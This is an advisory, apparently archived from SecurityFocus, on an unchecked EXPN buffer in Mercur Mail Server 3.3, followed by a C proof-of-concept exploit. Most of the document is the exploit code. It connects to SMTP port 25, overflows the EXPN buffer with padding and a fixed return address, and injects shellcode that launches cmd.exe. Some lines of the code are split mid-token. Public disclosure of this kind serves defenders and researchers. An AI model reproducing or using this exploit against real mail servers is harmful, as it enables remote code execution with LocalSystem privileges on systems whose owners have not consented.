source: http://www.securityfocus.com/bid/2412/info

Atrium Software Mercur Mail Server 3.3 contains an unchecked buffer for the EXPN command which may lead to a denial of service attack or execution of arbitrary code depending on the data entered.

If a remote attacker were to telnet to the SMTP server and enter an overly long string of random characters following the EXPN command, the remote target would crash. The execution of arbitrary code is possible if a carefully crafted string that overwrote the EIP was entered into the buffer. The attacker would be able to perform virtually any action on the remote system under the context of the LocalSystem account. 

/*
 MERCUR Mailserver 3.3 Remote Buffer Overflow
 Tested on Win2K AS SP1 with MERCUR SMTP-
Server v3.30.03
 Martin Rakhmanoff
 martin@direct.spb.ru
*/

#include <winsock2.h>
#include <stdio.h>

/* \x63\x6D\x64\x2E\x65\x78\x65 - simply 'cmd.exe' */
char shellcode[] =
 "\x8B\xC4\x83\xC0\x17\x50\xB8\x0E\xB5\xE9\x77
\xFF\xD0\x33\xDB\x53"
 "\xB8\x2D\xF3\xE8\x77\xFF\xD0\x63\x6D\x64
\x2E\x65\x78\x65\x0D\x0A";
/*
In SoftICE bpx 001b:00418b65 - here eip is restored
with overwritten
value...
*/

int main(int argc, char * argv[]){

 int i;
 char sploit[512];
 char buffer[512];

 WSADATA wsaData;
 SOCKET  sock;
 struct sockaddr_in server;
 struct hostent *hp;

 WSAStartup(0x202,&wsaData);
 hp = gethostbyname("arena");
 memset(&server,0,sizeof(server));
 memcpy(&(server.sin_addr),hp->h_addr,hp-
>h_length);
 server.sin_family = hp->h_addrtype;
 server.sin_port = htons(25);
 sock = socket(AF_INET,SOCK_STREAM,0);
 connect(sock,(struct sockaddr*)&server,sizeof
(server));

 sploit[0]='E';
 sploit[1]='X';
 sploit[2]='P';
 sploit[3]='N';
 sploit[4]=0x20;


 for(i=5;i<137;i++){
  sploit[i]=0x41;
 }

 // Return address
 //77E87D8B

 sploit[137]=0x8B;
 sploit[138]=0x89;
 sploit[139]=0xE8;
 sploit[140]=0x77;

 for(i=0;i<sizeof(shellcode);i++){
  sploit[i+141]=shellcode[i];
 }

 recv(sock,buffer,512,0);

 send(sock,sploit,173,0);

 closesocket(sock);
 WSACleanup();

 return 0;
}